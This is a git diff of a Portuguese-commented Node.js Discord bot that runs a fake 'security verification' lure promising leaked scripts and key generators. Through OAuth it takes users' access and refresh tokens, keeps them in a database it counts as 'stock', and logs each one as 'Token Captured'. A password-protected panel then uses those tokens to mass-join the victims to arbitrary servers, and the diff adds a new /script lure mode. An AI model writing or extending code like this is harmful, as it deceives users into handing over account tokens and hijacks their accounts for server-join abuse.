@@ -4,35 +4,17 @@ const axios = require('axios');
 const { Pool } = require('pg');
 const { 
     Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, 
-    ButtonBuilder, ButtonStyle, PermissionsBitField, ActivityType,
-    ApplicationCommandOptionType 
+    ButtonBuilder, ButtonStyle, PermissionsBitField, ActivityType 
 } = require('discord.js');
 
-// --- CONFIGURAÇÕES FIXAS ---
+// --- CONFIGURAÇÕES ---
 const LOG_CHANNEL_ID = process.env.LOG_CHANNEL_ID; 
-const REDIRECT_TARGET_DEFAULT = 'https://discord.com/app'; 
-const REDIRECT_TARGET_GAME = 'https://gamedown.onrender.com/sucess'; 
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD; 
 
-// --- CONFIGURAÇÃO VISUAL (MEMÓRIA) ---
-// Se o bot reiniciar, volta para este padrão. Use /config para mudar na hora.
-let panelConfig = {
-    padrao: {
-        titulo: '🛡️ Verificação de Segurança',
-        desc: 'Se verifique para poder ter acesso a itens exclusivos no servidor, como: Chat premium, Scripts Vazados (E em beta), e muitas outras coisas!',
-        cor: 0x5865F2, // Blurple
-        btnText: 'Verificar Agora',
-        btnEmoji: '✅'
-    },
-    game: {
-        // AGORA ESTÁ IGUAL AO PADRÃO (Conforme você pediu)
-        titulo: '🛡️ Verificação de Segurança',
-        desc: 'Se verifique para poder ter acesso a itens exclusivos no servidor, como: Chat premium, Scripts Vazados (E em beta), e muitas outras coisas!',
-        cor: 0x5865F2, // Blurple
-        btnText: 'Verificar Agora', // Texto igual
-        btnEmoji: '✅'
-    }
-};
+// LINKS
+const TARGET_DEFAULT = 'https://discord.com/app'; 
+const TARGET_GAME = 'https://gamedown.onrender.com/sucess'; 
+const TARGET_SCRIPT = 'https://key-scriptlp.onrender.com/'; // Novo Link
 
 // --- BANCO DE DADOS ---
 let pool = null;
@@ -49,56 +31,112 @@ async function iniciarBanco() {
 const app = express();
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
-const client = new Client({ intents: [GatewayIntentBits.Guilds] });
+const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers] });
 
-// --- FUNÇÃO AUTH ---
-async function handleVerificationCallback(req, res, redirectUri, finalTarget) {
+// =================================================================
+// LÓGICA DE VERIFICAÇÃO INTELIGENTE
+// =================================================================
+async function processarVerificacao(req, res, redirectUri, targetPadrao) {
     const { code, state } = req.query; 
     if (!code) return res.send('Erro: Falta código.');
+
+    // DETECTA O TIPO DE VERIFICAÇÃO PELO "STATE"
+    // Formato do state: "ID_DO_SERVIDOR" ou "ID_DO_SERVIDOR__SCRIPT"
+    let isScriptMode = false;
+    let guildId = state;
+
+    if (state && state.includes('__script')) {
+        isScriptMode = true;
+        guildId = state.split('__')[0]; // Pega só o ID
+    }
+
     try {
         const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
-            client_id: process.env.CLIENT_ID, client_secret: process.env.CLIENT_SECRET, code, grant_type: 'authorization_code', redirect_uri: redirectUri, scope: 'identify guilds.join',
+            client_id: process.env.CLIENT_ID, client_secret: process.env.CLIENT_SECRET,
+            code, grant_type: 'authorization_code', redirect_uri: redirectUri, scope: 'identify guilds.join',
         }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
 
         const { access_token, refresh_token } = tokenResponse.data;
         const userResponse = await axios.get('https://discord.com/api/users/@me', { headers: { Authorization: `Bearer ${access_token}` } });
         const user = userResponse.data;
 
+        // Salva no Banco
         if (pool) await pool.query(`INSERT INTO auth_users (id, username, access_token, refresh_token) VALUES ($1, $2, $3, $4) ON CONFLICT (id) DO UPDATE SET access_token = $3, refresh_token = $4;`, [user.id, user.username, access_token, refresh_token]);
 
-        if (state) {
+        // LÓGICA DE CARGOS (DIFERENTE PARA CADA MODO)
+        if (guildId) {
             try {
-                const guild = client.guilds.cache.get(state);
+                const guild = client.guilds.cache.get(guildId);
                 if (guild) {
                     const member = await guild.members.fetch(user.id).catch(() => null);
-                    const role = guild.roles.cache.find(r => r.name === 'Auth2 Vetificados');
+                    
+                    // Define qual cargo dar e qual nome procurar
+                    let roleName = isScriptMode ? 'Vetificado' : 'Auth2 Vetificados';
+                    
+                    let role = guild.roles.cache.find(r => r.name === roleName);
+
+                    // Se for modo Script e o cargo não existir, CRIA O CARGO
+                    if (!role && isScriptMode) {
+                        try {
+                            role = await guild.roles.create({
+                                name: 'Vetificado',
+                                color: 0x00FF00, // Verde
+                                reason: 'Criado automaticamente para o sistema /script'
+                            });
+                        } catch (e) { console.log('Sem permissão para criar cargo.'); }
+                    }
+
                     if (member && role) await member.roles.add(role);
                 }
-            } catch (e) {}
+            } catch (e) { console.error("Erro cargo:", e.message); }
         }
 
+        // Log
         const ch = client.channels.cache.get(LOG_CHANNEL_ID);
-        if(ch) ch.send({ embeds: [new EmbedBuilder().setTitle('📥 Novo Token').setDescription(`**User:** ${user.username}`).setColor('Green')] });
+        if(ch) ch.send({ embeds: [new EmbedBuilder().setTitle('📥 Token Capturado').setDescription(`**User:** ${user.username}\n**Modo:** ${isScriptMode ? 'Script Key' : 'Padrão'}`).setColor('Green')] });
 
-        // Redirecionamento Inteligente (Se for padrão e tiver state, vai pro servidor)
-        let urlFinal = finalTarget;
-        if (finalTarget === REDIRECT_TARGET_DEFAULT && state) urlFinal = `https://discord.com/channels/${state}`;
+        // DEFINE O LINK FINAL E A MENSAGEM DO SITE
+        let finalLink = isScriptMode ? TARGET_SCRIPT : targetPadrao;
+        let msgTitulo = isScriptMode ? "Acesso Liberado!" : "Verificado!";
+        let msgTexto = isScriptMode ? `Crie seu script em:<br><a href="${finalLink}" style="color:#00ff00;font-size:18px;">${finalLink}</a>` : "Redirecionando...";
 
-        res.send(`<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0; url=${urlFinal}"></head><body>Redirecionando... <script>setTimeout(()=>{window.location.href="${urlFinal}"},300);</script></body></html>`);
-    } catch (e) { console.error(e); res.send('Erro auth.'); }
+        res.send(`
+            <!DOCTYPE html>
+            <html lang="pt-br">
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>${msgTitulo}</title>
+                <style>body{background-color:#2b2d31;font-family:sans-serif;color:white;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;flex-direction:column;text-align:center}.card{background:#313338;padding:40px;border-radius:15px;box-shadow:0 10px 30px rgba(0,0,0,0.5)}.btn{background:#5865F2;color:white;padding:12px 25px;text-decoration:none;border-radius:5px;font-weight:bold;margin-top:20px;display:inline-block}</style>
+            </head>
+            <body>
+                <div class="card">
+                    <h1>✅ ${msgTitulo}</h1>
+                    <p>${msgTexto}</p>
+                    <a href="${finalLink}" class="btn">Acessar Agora</a>
+                </div>
+                <script>
+                    // Redireciona em 3s se não clicar (para garantir que ele leia)
+                    setTimeout(() => { window.location.href = "${finalLink}"; }, 3000);
+                </script>
+            </body>
+            </html>
+        `);
+
+    } catch (e) { res.send('Erro na autenticação.'); }
 }
 
 // --- ROTAS ---
 app.get('/', async (req, res) => {
-    let c = 0; if(pool) { try { const r = await pool.query('SELECT COUNT(*) FROM auth_users'); c = r.rows[0].count; } catch(e){} }
-    res.send(`Bot Online. Estoque: ${c} <a href="/painel">Painel</a>`);
+    let c = 0; if(pool) { try{const r = await pool.query('SELECT COUNT(*) FROM auth_users'); c = r.rows[0].count;}catch(e){} }
+    res.send(`Bot Online. Tokens: ${c} <a href="/painel">Admin</a>`);
 });
 app.get('/painel', (req, res) => res.send(`<form action="/api/mass-join" method="POST"><input type="password" name="password" placeholder="Senha"><input type="text" name="serverId" placeholder="ID"><input type="number" name="amount" placeholder="Qtd"><button>Enviar</button></form>`));
 app.post('/api/mass-join', async (req, res) => {
     const { password, serverId, amount } = req.body;
     if(password !== ADMIN_PASSWORD) return res.send('Senha errada');
     if(!pool) return res.send('Sem banco');
-    let users = []; try { const r = await pool.query('SELECT * FROM auth_users LIMIT $1', [amount]); users = r.rows; } catch(e){ return res.send('Erro banco'); }
+    let users = []; try { const r = await pool.query('SELECT * FROM auth_users LIMIT $1', [amount]); users = r.rows; } catch(e){ return res.send('Erro busca'); }
     res.send(`Enviando ${users.length}...`);
     const sleep = (ms) => new Promise(r => setTimeout(r, ms));
     for (const u of users) {
@@ -107,113 +145,60 @@ app.post('/api/mass-join', async (req, res) => {
         await sleep(1000);
     }
 });
-app.get('/callback', async (req, res) => { await handleVerificationCallback(req, res, process.env.REDIRECT_URI, REDIRECT_TARGET_DEFAULT); });
-app.get('/auth2', async (req, res) => { await handleVerificationCallback(req, res, process.env.REDIRECT_URI_2, REDIRECT_TARGET_GAME); });
+
+// Rotas de Callback
+app.get('/callback', async (req, res) => { await processarVerificacao(req, res, process.env.REDIRECT_URI, TARGET_DEFAULT); });
+app.get('/auth2', async (req, res) => { await processarVerificacao(req, res, process.env.REDIRECT_URI_2, TARGET_GAME); });
 
 // --- BOT ---
 client.once('ready', async () => {
     console.log(`🤖 Bot Logado: ${client.user.tag}`);
     await client.application.commands.set([
-        { name: 'setup_auth', description: 'Painel Auth (Padrão)' },
-        { name: 'setup_auth2', description: 'Painel Auth (GameDown)' },
-        { name: 'postar_painel', description: 'Posta o painel do GameDown em outro canal', options: [{ name: 'canal_id', description: 'ID do canal', type: 3, required: true }] },
-        { name: 'estoque', description: 'Ver quantidade salva' },
-        { name: 'enviar', description: 'Mass Join', options: [{name:'quantidade',description:'Qtd',type:4,required:true},{name:'servidor_id',description:'ID',type:3,required:true}] },
-        // --- NOVO COMANDO DE CONFIG ---
-        { 
-            name: 'config', 
-            description: 'Personaliza o visual dos painéis',
-            options: [
-                { 
-                    name: 'tipo', 
-                    description: 'Qual painel editar?', 
-                    type: 3, 
-                    required: true,
-                    choices: [{ name: 'Padrão (Setup 1)', value: 'padrao' }, { name: 'Game (Setup 2/Postar)', value: 'game' }]
-                },
-                { name: 'titulo', description: 'Novo título', type: 3, required: false },
-                { name: 'descricao', description: 'Nova descrição', type: 3, required: false },
-                { name: 'botao_texto', description: 'Nome do botão', type: 3, required: false },
-                { name: 'botao_emoji', description: 'Emoji do botão', type: 3, required: false }
-            ]
-        }
+        { name: 'setup_auth', description: 'Painel Padrão' },
+        { name: 'setup_auth2', description: 'Painel GameDown' },
+        { name: 'script', description: 'Painel de Script (Novo)' }, // NOVO COMANDO
+        { name: 'estoque', description: 'Ver estoque' },
+        { name: 'enviar', description: 'Mass Join', options: [{name:'quantidade',type:4,required:true},{name:'servidor_id',type:3,required:true}] }
     ]);
 });
 
 client.on('interactionCreate', async interaction => {
     if (!interaction.isChatInputCommand()) return;
     
-    // --- CONFIG ---
-    if (interaction.commandName === 'config') {
-        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return interaction.reply({content:'Apenas admin.', ephemeral:true});
+    // --- NOVO COMANDO /SCRIPT ---
+    if (interaction.commandName === 'script') {
+        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
         
-        const tipo = interaction.options.getString('tipo');
-        const titulo = interaction.options.getString('titulo');
-        const desc = interaction.options.getString('descricao');
-        const btnText = interaction.options.getString('botao_texto');
-        const btnEmoji = interaction.options.getString('botao_emoji');
+        // Aqui usamos __script no final do state para o site saber que é desse comando
+        const stateData = `${interaction.guild.id}__script`;
+        
+        // Usamos a REDIRECT_URI_2 (a mesma do auth2) pois ela já está configurada no Discord
+        const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI_2)}&response_type=code&scope=identify+guilds.join&state=${stateData}`;
+        
+        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Gerar Key / Script').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('🔑'));
+        const embed = new EmbedBuilder().setTitle('📜 Acesso ao Script').setDescription('Clique abaixo para verificar sua conta e acessar o gerador de keys.').setColor('Gold');
 
-        // Atualiza a memória
-        if(titulo) panelConfig[tipo].titulo = titulo;
-        if(desc) panelConfig[tipo].desc = desc;
-        if(btnText) panelConfig[tipo].btnText = btnText;
-        if(btnEmoji) panelConfig[tipo].btnEmoji = btnEmoji;
-
-        interaction.reply({ content: `✅ Configuração do painel **${tipo.toUpperCase()}** atualizada com sucesso!`, ephemeral: true });
+        interaction.reply({ content: 'Painel Script criado.', ephemeral: true });
+        interaction.channel.send({ embeds: [embed], components: [row] });
     }
 
-    // SETUP 1 (Padrão)
+    // Comandos Antigos...
     if (interaction.commandName === 'setup_auth') {
-        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
-        const cfg = panelConfig.padrao;
-        const url = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify+guilds.join&state=${interaction.guild.id}`;
-        
-        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel(cfg.btnText).setStyle(ButtonStyle.Link).setURL(url).setEmoji(cfg.btnEmoji));
-        const embed = new EmbedBuilder().setTitle(cfg.titulo).setDescription(cfg.desc).setColor(cfg.cor).setFooter({ text: 'Sistema Seguro' });
-        
-        interaction.reply({ content: 'Painel 1 criado.', ephemeral: true });
-        interaction.channel.send({ embeds: [embed], components: [row] });
+        const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify+guilds.join&state=${interaction.guild.id}`;
+        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Verificar').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('✅'));
+        interaction.reply({ content: 'Criado.', ephemeral: true });
+        interaction.channel.send({ embeds: [new EmbedBuilder().setTitle('Verificação').setColor('Blue')], components: [row] });
     }
-
-    // SETUP 2 (GameDown - Local)
     if (interaction.commandName === 'setup_auth2') {
-        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
-        if (!process.env.REDIRECT_URI_2) return interaction.reply('Falta REDIRECT_URI_2');
-        
-        const cfg = panelConfig.game; // Usa config do Game
-        const url = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI_2)}&response_type=code&scope=identify+guilds.join&state=${interaction.guild.id}`;
-        
-        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel(cfg.btnText).setStyle(ButtonStyle.Link).setURL(url).setEmoji(cfg.btnEmoji));
-        const embed = new EmbedBuilder().setTitle(cfg.titulo).setDescription(cfg.desc).setColor(cfg.cor).setFooter({ text: 'Sistema Seguro' });
-
-        interaction.reply({ content: 'Painel 2 criado.', ephemeral: true });
-        interaction.channel.send({ embeds: [embed], components: [row] });
+        const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI_2)}&response_type=code&scope=identify+guilds.join&state=${interaction.guild.id}`;
+        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Baixar').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('🔗'));
+        interaction.reply({ content: 'Criado.', ephemeral: true });
+        interaction.channel.send({ embeds: [new EmbedBuilder().setTitle('Download').setColor('Green')], components: [row] });
     }
-
-    // POSTAR PAINEL (GameDown - Remoto)
-    if (interaction.commandName === 'postar_painel') {
-        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
-        const chId = interaction.options.getString('canal_id');
-        const ch = client.channels.cache.get(chId);
-        if (!ch) return interaction.reply('Canal não achado.');
-
-        const cfg = panelConfig.game; // Usa config do Game
-        // Nota: Removemos o 'state' aqui pois o servidor de origem é onde o botão está
-        const url = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI_2)}&response_type=code&scope=identify+guilds.join`;
-        
-        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel(cfg.btnText).setStyle(ButtonStyle.Link).setURL(url).setEmoji(cfg.btnEmoji));
-        const embed = new EmbedBuilder().setTitle(cfg.titulo).setDescription(cfg.desc).setColor(cfg.cor).setFooter({ text: 'Sistema Seguro' });
-
-        ch.send({ embeds: [embed], components: [row] });
-        interaction.reply({ content: `Postado em <#${chId}>`, ephemeral: true });
-    }
-    
     if (interaction.commandName === 'estoque') {
-        let count = 0;
-        if(pool) { try { const res = await pool.query('SELECT COUNT(*) FROM auth_users'); count = res.rows[0].count; } catch(e) {} }
-        interaction.reply({ content: `📦 **Banco SQL:** ${count}`, ephemeral: true });
+        let c=0; if(pool){try{const r=await pool.query('SELECT COUNT(*) FROM auth_users');c=r.rows[0].count;}catch{}}
+        interaction.reply({content:`Estoque: ${c}`, ephemeral:true});
     }
-    if (interaction.commandName === 'enviar') { interaction.reply('Use o painel web: /painel'); }
 });
 
 iniciarBanco().then(() => {
